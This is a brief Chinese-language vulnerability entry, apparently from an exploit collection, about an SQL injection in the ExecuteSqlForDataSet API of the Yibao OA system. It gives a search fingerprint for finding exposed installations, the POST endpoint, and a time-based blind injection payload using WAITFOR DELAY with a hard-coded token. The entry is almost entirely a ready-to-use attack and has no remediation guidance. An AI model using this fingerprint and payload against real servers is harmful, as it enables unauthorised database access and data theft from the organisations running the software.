# 易宝OA-ExecuteSqlForDataSet接口存在SQL注入漏洞

易宝OA-ExecuteSqlForDataSet接口 ｜ SQL注入 ｜ —
- **指纹**：`product="顶讯科技-易宝OA系统"`
- **请求**：`POST /api/system/ExecuteSqlForDataSet HTTP/1.1`

**Payload**
```
token=zxh&sql=;WAITFOR DELAY '0:0:5'--&strParameters
```
- **响应特征**：200